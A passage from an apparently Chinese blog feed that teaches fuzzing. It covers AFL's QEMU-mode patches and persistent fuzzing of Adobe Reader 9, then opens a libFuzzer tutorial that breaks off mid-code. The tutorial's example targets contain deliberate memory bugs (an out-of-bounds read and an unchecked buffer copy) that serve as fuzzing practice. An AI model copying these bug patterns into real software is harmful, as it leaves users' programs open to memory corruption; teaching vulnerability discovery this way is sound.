href="https://ndltd.ncl.edu.tw/cgi-bin/gs32/gsweb.cgi/login?o=dnclcdr&s=id=%22106NCTU5726039%22.&searchmode=basic">以执行文件改写支持覆盖率引导的模糊测试</a></li></ul></li><li><p>重新组装（Reassemble） - 尝试将新增的指令嵌入原本的基本块中，挑战在于如何重新组织原指令，使其仍能维持原程序逻辑，并且新增的指令不会影响程序执行。</p></li><li><p>动态二进制插桩</p><ul><li>通过模拟器模拟程序执行，特别是在将基本块转成IR之前，先插入一段收集覆盖度的IR，在动态模拟执行时就能知道执行了哪些基本块。</li></ul></li></ul><p>动态和静态各自的优点：</p><ul><li>动态：可以获得数据的状态，比如结构或类型，结果较为准确。</li><li>静态：只做一次分析和修正，就能节省后续执行带来的开销。</li></ul><p>在实际应用中我们应用最多的就是动态二进制插桩。</p><p>QEMU 是一个用于模拟程序执行的工具，主要应用于测试程序的执行，或者执行不同指令集的程序。QEMU 实际上分为两种模式：全系统仿真和用户模式仿真，前者是包含操作系统执行的模拟，后者仅模拟程序的执行。QEMU 的代码库非常庞大，由多个组件组成，因此无法做非常详细的介绍，但大致的流程如下：</p><ol><li><p><strong>初始化</strong> - 一些初始化服务，比如内存管理等，必须在执行程序之前完成。</p></li><li><p><strong>处理执行文件</strong> - 读取用户指定的执行文件并解析其元数据。</p></li><li><p><strong>模拟执行</strong> - QEMU 提供了多种模拟方式，但基本上都很复杂。最直观的方式是：逐行读取指令，查看指令的助记符（如 <code>add</code>、<code>sub</code> 等），执行相应的处理器，记录执行结果，然后执行下一条指令。</p></li></ol><p>AFL 的二进制模式是通过 QEMU 模拟器实现的。不过，QEMU 默认并不会记录覆盖率，因此需要修改 QEMU 的源代码来实现这一功能。相关的 patch 文件可以在 <a href="https://github.com/google/AFL/tree/master/qemu_mode/patches">AFL repo qemu_mode&#x2F;patches</a> 中找到，下面简要介绍一下这些修改的内容。</p><p>有一些 diff 文件仅做了一些初始化和配置，以下是简要的文字说明：</p><ul><li><p><code>syscall.diff</code> - 更新 kill 处理，确保发送 <code>SIGABRT</code> 时 forkserver 线程能够接收到。</p></li><li><p><code>configure.diff / memfd.diff</code> - 使用内存映射（memory mapping）而不是内存文件描述符（memory fd）。</p></li><li><p><code>elfload.diff</code> - 在解析执行文件的元数据时，初始化 <code>afl_start_code</code> 和 <code>afl_end_code</code>，这两个标记代表需要被收集覆盖率的程序代码地址的起始和结束位置，<code>afl_entry_point</code> 用来记录程序的入口点。</p></li></ul><p><strong>cpu-exec.diff</strong> ：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">--- qemu-2.10.0-rc3-clean/accel/tcg/cpu-exec.c  2017-08-15 11:39:41.000000000 -0700  </span><br><span class="hljs-comment">+++ qemu-2.10.0-rc3/accel/tcg/cpu-exec.c      2017-08-22 14:34:55.868730680 -0700  </span><br><span class="hljs-meta">@@ -36,6 +36,8 @@</span>  <br> #include &quot;sysemu/cpus.h&quot;  <br> #include &quot;sysemu/replay.h&quot;  <br>   <br><span class="hljs-addition">+#include &quot;../patches/afl-qemu-cpu-inl.h&quot;  </span><br>​  <br> typedef struct SyncClocks &#123;  <br><span class="hljs-meta">@@ -144,6 +146,8 @@</span>  <br>     int tb_exit;  <br>     uint8_t *tb_ptr = itb-&gt;tc_ptr;  <br>   <br><span class="hljs-addition">+    AFL_QEMU_CPU_SNIPPET2;  </span><br><span class="hljs-addition">+  </span><br>     qemu_log_mask_and_addr(CPU_LOG_EXEC, itb-&gt;pc,  <br>                            &quot;Trace %p [%d: &quot; TARGET_FMT_lx &quot;] %s\n&quot;,  <br>                            itb-&gt;tc_ptr, cpu-&gt;cpu_index, itb-&gt;pc,  <br><span class="hljs-meta">@@ -365,6 +369,7 @@</span>  <br>             if (!tb) &#123;  <br>                 tb = tb_gen_code(cpu, pc, cs_base, flags, 0);  <br><span class="hljs-addition">+                AFL_QEMU_CPU_SNIPPET1;  </span><br>             &#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>AFL_QEMU_CPU_SNIPPET2</code> 宏会在执行到程序代码地址等同于 <code>afl_entry_point</code> 时唤醒 fork server，并记录新的覆盖率。</p></li><li><p><code>AFL_QEMU_CPU_SNIPPET1</code> 宏则会提前通知 QEMU 进行转换，避免在 fork 后还要重新进行转换，从而减少额外的开销。</p><ul><li>QEMU 转换会将原本程序的汇编代码转换为 QEMU 能够理解的形式（IR），然后模拟执行时会更快。</li></ul></li></ul><p><strong>afl-qemu-cpu-inl.h</strong> 定义了与模糊测试相关的处理，下面摘取了其中重要的部分进行说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 通知 tsl（translation handler）对指定基本块进行转换  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET1 do &#123; \  </span><br>    afl_request_tsl(pc, cs_base, flags); \  <br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)  <br>​  <br><span class="hljs-comment">// 如果执行到入口点，就唤醒 fork server，  </span><br><span class="hljs-comment">// 并且记录覆盖率  </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \  </span><br>    <span class="hljs-keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \  <br>      afl_setup(); \  <br>      afl_forkserver(cpu); \  <br>    &#125; \  <br>    afl_maybe_log(itb-&gt;pc); \  <br>  &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>)  <br>​  <br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> &#123;  <br>​  <br>    <span class="hljs-type">static</span> __thread abi_ulong prev_loc;  <br>    <span class="hljs-comment">// 避免记录不在 start ~ end 范围的覆盖率  </span><br>    <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)  <br>        <span class="hljs-keyword">return</span>;  <br>​  <br>    cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  <br>    cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <br>​  <br>    <span class="hljs-comment">// 通过概率插桩进行优化  </span><br>    <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  <br>    afl_area_ptr[cur_loc ^ prev_loc]++;  <br>    prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">CPU_TARGET=i386 ./build_qemu_support.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">make</span> distrib<br>sudo <span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>针对黑盒、仅有二进制目标的仪器化是通过QEMU的“用户仿真”模式实现的。这也允许执行跨架构的代码——例如，在x86上运行ARM二进制程序。</p><p>QEMU使用基本块作为翻译单元；仪器化则是在此基础上实现的，模型类似于编译时钩子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (block_address &gt; elf_text_start &amp;&amp; block_address &lt; elf_text_end) &#123;<br><br>    cur_location = (block_address &gt;&gt; <span class="hljs-number">4</span>) ^ (block_address &lt;&lt; <span class="hljs-number">8</span>);<br><br>    shared_mem[cur_location ^ prev_location]++;<br><br>    prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>QEMU模式的启动相对较慢；为了解决这个问题，AFL fork服务器通过提供仿真器与父进程之间的通信通道来进行优化。该通道用于通知父进程任何新遇到的块的地址，并将其添加到翻译缓存中，以便将来子进程可以复用。</p><p>通过这些优化，QEMU模式的开销大约为2-5倍，相比之下，PIN的开销超过100倍。</p><p>我们前面所学习的都是通过 AFL 对开源程序进行 Fuzz，下面我们学习如何通过 qemu_mode 对闭源程序进行 Fuzz。</p><p>AFL_USE_QASAN</p><p>使用 qemu fuzz其它架构的程序，或者将afl移植到异架构设备上。</p><p>告诉qemu从某个地址启动forkserver，循环起始的地址，循环结束的地址。</p><p>通过环境变量进行持续性的fuzz。</p><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">编译qemu</span><br>./build_qemu_support.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">fuzz异架构</span><br>CPU_TARGET=arm ./build_qemu_support.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">移植</span><br>STATIC=1 HOST=arm-linux-gnueabi CPU_TARGET=arm ./build_qemu_support.sh<br></code></pre></td></tr></table></figure><ul><li>使用</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">afl-fuzz -<span class="hljs-selector-tag">i</span> in -o out -m <span class="hljs-attribute">none</span> -<span class="hljs-selector-tag">Q</span> ./test<br></code></pre></td></tr></table></figure><h3 id="qemu模式"><a href="#qemu模式" class="headerlink" title="qemu模式"></a>qemu模式</h3><p>使用<code>-Q</code>参数开启 qemu mode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@<br><br>afl-fuzz -Q -i ./in -o ./out -t 2000 -- mb @@<br></code></pre></td></tr></table></figure><p>但现在模糊测试速度非常慢：在我的机器上大约每秒7次执行。那么，我们如何提高模糊测试速度呢？</p><p>我们接下来了解 qemu 的持久模式。</p><h3 id="持久模式-1"><a href="#持久模式-1" class="headerlink" title="持久模式"></a>持久模式</h3><p>默认情况下，AFL++ 每次变异一个输入样本就会 <strong>重新启动目标程序</strong>，这在大型程序（如 Adobe Reader）中非常低效。</p><p>持久模式通过 <strong>在一次程序运行中处理多个输入</strong> 来显著提高性能。</p><p>如我们在<a href="typora://app/Exercise%206">练习6</a>中看到的，插入<code>AFL_LOOP</code>是我们告诉AFL++要启用持久模式的方式。但在这种情况下，我们无法访问源代码。</p><p>使用 <strong><code>AFL_QEMU_PERSISTENT_ADDR</code></strong> 指定一个 <strong>函数的地址</strong>，告诉 AFL++ 在那里插入持久循环钩子，从而避免重复加载程序。</p><p>为了找到合适的偏移量，我们可以使用像IDA或Ghidra这样的反汇编工具。在我的例子中，我选择了偏移量<code>0x08546a00</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install valgrind kcachegrind<br></code></pre></td></tr></table></figure><p>使用 callgrind 收集运行数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader \<br>ACRO_CONFIG=intellinux \<br>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; \<br>valgrind --tool=callgrind /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript sample.pdf<br></code></pre></td></tr></table></figure><p>使用 <code>kcachegrind</code> 打开生成的 <code>callgrind.out.*</code> 文件：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">kcachegrind</span><br></code></pre></td></tr></table></figure><p>建议你在kcachegrind中查看<code>count</code>字段，识别只执行1次的函数，并尝试在afl-fuzz中达到<strong>超过90%的稳定性分数</strong>。</p><p>我们还将设置<strong>AFL_QEMU_PERSISTENT_GPR&#x3D;1</strong>环境变量，它将在每个持久周期中保存和恢复通用寄存器的原始值。</p><p>现在，我们可以用以下命令行运行模糊测试器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_QEMU_PERSISTENT_ADDR=0x085478AC \<br>AFL_QEMU_PERSISTENT_GPR=1 \<br>ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader \<br>ACRO_CONFIG=intellinux \<br>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; \<br>afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- \<br>/opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@<br><br></code></pre></td></tr></table></figure><p>如你所见，执行时间提高了4倍。不错！</p><h3 id="Fuzz-1"><a href="#Fuzz-1" class="headerlink" title="Fuzz"></a>Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><h3 id="crash分析-1"><a href="#crash分析-1" class="headerlink" title="crash分析"></a>crash分析</h3><p>在发生 crash 之后，使用 afl-qemu-trace 来查看最终的crash信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><p>直接按照上面的常规的命令来执行 trace，会报页错误。所以我们使用另外一种方法—— <a href="https://github.com/andreafioraldi/qasan">QASAN</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>在 AFL++ 的 utils 目录中提供了各种各样的辅助 Fuzz 的工具。</p><p>除了 AFL 之外常用的还有 libFuzzer和honggfuzz。其中 libFuzzer 是一个和 AFL 完全不同的 Fuzz 工具，它是一种新的思想的实现，可以说后来的 go-fuzz 等工具都是基于它的思想来实现的。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>Fuzzing: A Survey for Roadmap<br><a href="https://github.com/u1f383/fuzzing-learning-in-30-days/tree/main#">u1f383&#x2F;fuzzing-learning-in-30-days</a><br><a href="https://paper.seebug.org/841/">AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing</a><br><a href="https://paper.seebug.org/842/#_4">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a><br><a href="https://www.v4ler1an.com/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/#%E4%B8%80%E7%AE%80%E4%BB%8B">AFL二三事 – 1 - V4ler1an</a><br><a href="https://github.com/strongcourage/fuzzing-corpus/tree/master">strongcourage&#x2F;fuzzing-corpus: My fuzzing corpus</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libFuzzer浅探</title>
      <link href="/2025/07/01/fuzz/libfuzzer/"/>
      <url>/2025/07/01/fuzz/libfuzzer/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>libFuzzer 是一个基于覆盖率引导的进化模糊测试引擎，旨在通过代码覆盖优化输入数据，从而发现潜在的程序漏洞。libFuzzer 以库的形式链接到目标代码中，专门用于 fuzz 测试指定的目标函数。通过动态地将 fuzz 输入提供给目标函数，libFuzzer 能够有效地引导测试过程，优化覆盖的路径，并且通常用于 C&#x2F;C++ 项目的单元测试。</p><p>需要注意的是，模糊测试的目标与 libFuzzer 本身无关，因此可以将其与其他模糊测试引擎（如 AFL 或 Radamsa）结合使用，以增强测试效果。</p><p>libFuzzer 基于 LLVM 项目实现，是一个编译好的链接库，特别适用于有源代码的程序，且程序已经设计了能够处理 fuzz 输入的接口。</p><ul><li>传统 Fuzz</li></ul><p>传统模糊测试的基本思路是向目标程序输入随机数据，观察程序是否发生崩溃或其他异常行为。这些输入数据没有特别的引导，通常是纯粹的随机字节流或变种。</p><ul><li>覆盖率引导 Fuzz</li></ul><p>覆盖引导模糊测试通过分析程序的执行路径（即代码覆盖率），来指导生成更有针对性的测试用例。它不仅仅生成随机数据，而是根据程序执行的代码路径反馈来优化输入，从而覆盖程序更多的分支和代码区域。</p><p>libFuzzer 是 LLVM 项目的一部分，实现代码在<code>llvm-project/compiler-rt/lib/fuzzer</code>目录下。</p><h3 id="目标函数"><a href="#目标函数" class="headerlink" title="目标函数"></a>目标函数</h3><p>LibFuzzer 不是对整个程序进行模糊测试，而是测试一个格式为如下签名的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span>;<br></code></pre></td></tr></table></figure><p>你需要自己实现这个函数，LibFuzzer 会不断调用它，并提供不同的<code>Data</code>和<code>Size</code>。</p><p>libFuzzer以<code>LLVMFuzzerTestOneInput()</code>作为用户自定义的模糊测试入口点，用户只需要关注为 libFuzzer 生成的数据编写接口调用逻辑，而 libFuzzer 本身只需要做好数据生成即可。libFuzzer 的数据生成主要由三部分组成：</p><ol><li>用户指定的初始数据</li><li>数据变异</li><li>新路径发现</li></ol><p>libFuzzer 工作过程也可以简单地归纳为：</p><ol><li>初始化</li><li>生成数据</li><li>开始测试</li><li>收集代码覆盖率信息</li><li>生成数据</li><li>开始测试</li></ol><p>分析 libFuzzer 的启动过程我们可以指定，它的整个框架核心由：</p><ul><li>数据变异生成器</li><li>数据收集器</li><li>fuzzer核心逻辑模块</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>clang 6.0 及更高版本已经包含了 libFuzzer，因此我们只需要安装 clang 即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install clang llvm<br></code></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>这里我们通过 libFuzzer work 中的示例来学习如何编写 libFuzzer。</p><p>使用 libFuzzer 的第一步是实现一个模糊目标（fuzz target），这是一个接受字节数组并通过被测试的 API 执行某些操作的函数。代码示例如下：</p><h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><ul><li>漏洞函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">VulnerableFunction1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-type">bool</span> result = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (size &gt;= <span class="hljs-number">3</span>) &#123;<br>    result = data[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;U&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp;<br>             data[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;Z&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编写 fuzzer</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vulnerable_functions.h&quot;</span></span><br><br><span class="hljs-comment">//通过接口将数据投喂到目标函数</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  VulnerableFunction1(data, size);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -fsanitize=address,fuzzer first_fuzzer.cc -o first_fuzzer<br></code></pre></td></tr></table></figure><ul><li><code>-fsanitize=fuzzer</code>：启用 LibFuzzer</li><li><code>-fsanitize=address</code>：启用 ASan 检测内存错误</li></ul><p>创建一个空目录用于存放测试用例，并运行 Fuzz 程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> corpus<br>./first corpus<br></code></pre></td></tr></table></figure><p>libFuzzer 通过与被测试的库链接，向该库的特定入口函数（即“目标函数”）提供模糊的输入。模糊测试引擎通过追踪代码覆盖的区域来工作，并对输入数据进行变异，以最大化代码的覆盖率。libFuzzer 通过 LLVM 的 SanitizerCoverage 插件来获取代码覆盖信息。</p><ul><li>Fuzzing</li></ul><p>运行 Fuzzer 程序即可进行 Fuzz，如果程序崩溃就会在当前目录下生成 crash 样本。</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/Pasted%20image%2020250428115206.png"></p><p>可以看到以上 crash 样本内容就是<code>FUZ</code>。</p><p>当模糊测试程序发现新的有趣的测试用例（即 通过被测代码触发新路径的覆盖率），这些测试用例 将添加到 corpus 目录中。</p><ul><li>复现崩溃</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./first_fuzzer crash-0eb8e4ed029b774d80f2b66408203801cb982a60<br></code></pre></td></tr></table></figure><p><img src="/Linux/assets/Pasted%20image%2020250530075533.png"></p><p>ASan 会显示出当前 crash 的堆栈信息。</p><p>获取符号化的堆栈跟踪。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ASAN_OPTIONS=symbolize=1 ./first_fuzzer crash-0eb8e4ed029b774d80f2b66408203801cb982a60<br></code></pre></td></tr></table></figure><p><code>symbolize=1</code>启用堆栈跟踪的符号化解析，将二进制地址转换为可读的代码位置（如函数名、源文件行号）。</p><h3 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h3><p>示例 2 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> kMagicHeader = <span class="hljs-string">&quot;ZN_2016&quot;</span>;<br><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kMaxPacketLen = <span class="hljs-number">1024</span>;<br><span class="hljs-keyword">constexpr</span> std::<span class="hljs-type">size_t</span> kMaxBodyLength = <span class="hljs-number">1024</span> - <span class="hljs-built_in">sizeof</span>(kMagicHeader);<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">VulnerableFunction2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size, <span class="hljs-type">bool</span> verify_hash)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (size &lt; <span class="hljs-built_in">sizeof</span>(kMagicHeader))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-function">std::string <span class="hljs-title">header</span><span class="hljs-params">(<span class="hljs-keyword">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> <span class="hljs-type">char</span>*&gt;(data), <span class="hljs-keyword">sizeof</span>(kMagicHeader))</span></span>;<br><br>  std::array&lt;<span class="hljs-type">uint8_t</span>, kMaxBodyLength&gt; body;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(kMagicHeader, header.<span class="hljs-built_in">c_str</span>()))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">auto</span> target_hash = data[--size];<br><br>  <span class="hljs-keyword">if</span> (size &gt; kMaxPacketLen)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>  <span class="hljs-keyword">if</span> (!verify_hash)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>  std::<span class="hljs-built_in">copy</span>(data, data + size, body.<span class="hljs-built_in">data</span>());<br>  <span class="hljs-keyword">auto</span> real_hash = <span class="hljs-built_in">DummyHash</span>(body);<br>  <span class="hljs-keyword">return</span> real_hash == 